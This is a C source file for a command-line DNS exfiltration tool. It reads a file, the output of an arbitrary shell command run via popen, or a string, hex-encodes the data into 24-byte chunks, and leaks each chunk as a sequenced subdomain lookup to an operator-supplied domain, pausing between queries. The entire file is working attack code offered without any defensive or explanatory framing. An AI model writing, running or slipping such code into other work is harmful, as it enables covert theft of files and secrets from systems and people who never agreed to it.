#define _GNU_SOURCE
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>

#define CHUNK_BYTES  24
#define JITTER_MS    500

static const char hex[] = "0123456789abcdef";

static void hex_encode(const unsigned char *src, size_t len, char *dst)
{
    for (size_t i = 0; i < len; i++) {
        dst[i*2]     = hex[src[i] >> 4];
        dst[i*2 + 1] = hex[src[i] & 0xf];
    }
    dst[len*2] = '\0';
}

static void send_chunk(const char *encoded, uint32_t seq, const char *domain)
{
    char hostname[256];
    snprintf(hostname, sizeof(hostname), "%08x.%s.%s", seq, encoded, domain);

    struct addrinfo *res = NULL;
    getaddrinfo(hostname, NULL, NULL, &res);
    if (res) freeaddrinfo(res);
}

static void exfil_string(const char *data, size_t len, const char *domain)
{
    uint32_t seq = (uint32_t)time(NULL) & 0x00ffffff;
    size_t offset = 0;
    size_t chunks = 0;
    char encoded[CHUNK_BYTES * 2 + 1];

    while (offset < len) {
        size_t take = len - offset;
        if (take > CHUNK_BYTES) take = CHUNK_BYTES;

        hex_encode((const unsigned char *)data + offset, take, encoded);
        send_chunk(encoded, (seq << 8) | (uint32_t)(chunks & 0xff), domain);

        printf("  [seq=%08x] %s.%s\n",
               (seq << 8) | (uint32_t)(chunks & 0xff), encoded, domain);

        offset += take;
        chunks++;

        if (JITTER_MS > 0) {
            struct timespec ts = { 0, (long)JITTER_MS * 1000000L };
            nanosleep(&ts, NULL);
        }
    }
    printf("[*] sent %zu chunks (%zu bytes) via DNS to %s\n", chunks, len, domain);
}

static void exfil_file(const char *path, const char *domain)
{
    FILE *f = strcmp(path, "-") == 0 ? stdin : fopen(path, "rb");
    if (!f) { perror(path); return; }

    unsigned char chunk[CHUNK_BYTES];
    char encoded[CHUNK_BYTES * 2 + 1];
    uint32_t seq = (uint32_t)time(NULL) & 0x00ffffff;
    size_t seqn = 0;
    size_t total = 0;

    while (1) {
        size_t n = fread(chunk, 1, CHUNK_BYTES, f);
        if (n == 0) break;
        hex_encode(chunk, n, encoded);
        send_chunk(encoded, (uint32_t)((seq << 8) | (seqn & 0xff)), domain);

        printf("  [%04zu] %s.%s\n", seqn, encoded, domain);

        total += n;
        seqn++;
        if (JITTER_MS > 0) {
            struct timespec ts = { 0, (long)JITTER_MS * 1000000L };
            nanosleep(&ts, NULL);
        }
    }
    if (f != stdin) fclose(f);
    printf("[*] exfiltrated %zu bytes in %zu DNS queries to %s\n", total, seqn, domain);
}

static void exfil_cmd(const char *cmd, const char *domain)
{
    FILE *f = popen(cmd, "r");
    if (!f) { perror("popen"); return; }

    char buf[4096];
    size_t total = 0;

    char chunk[CHUNK_BYTES];
    char encoded[CHUNK_BYTES * 2 + 1];
    uint32_t seq = (uint32_t)time(NULL) & 0x00ffffff;
    size_t seqn = 0;
    size_t pending = 0;

    while (1) {
        int c = fgetc(f);
        if (c == EOF || pending == CHUNK_BYTES) {
            if (pending > 0) {
                hex_encode((unsigned char *)chunk, pending, encoded);
                send_chunk(encoded, (uint32_t)((seq << 8) | (seqn & 0xff)), domain);
                printf("  [%04zu] %s.%s\n", seqn, encoded, domain);
                total += pending;
                seqn++;
                pending = 0;
                if (JITTER_MS > 0) {
                    struct timespec ts = { 0, (long)JITTER_MS * 1000000L };
                    nanosleep(&ts, NULL);
                }
            }
            if (c == EOF) break;
        }
        if (c != EOF) chunk[pending++] = (char)c;
    }
    pclose(f);
    (void)buf;
    printf("[*] exfiltrated cmd output: %zu bytes in %zu queries\n", total, seqn);
}

int main(int argc, char *argv[])
{
    if (argc < 4) {
        fprintf(stderr, "usage: %s <file|cmd|str>\n", argv[0]);
        return 1;
    }

    const char *domain = argv[2];
    if (strcmp(argv[1], "file") == 0) exfil_file(argv[3], domain);
    else if (strcmp(argv[1], "cmd") == 0) exfil_cmd(argv[3], domain);
    else if (strcmp(argv[1], "str") == 0) exfil_string(argv[3], strlen(argv[3]), domain);
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }

    return 0;
}
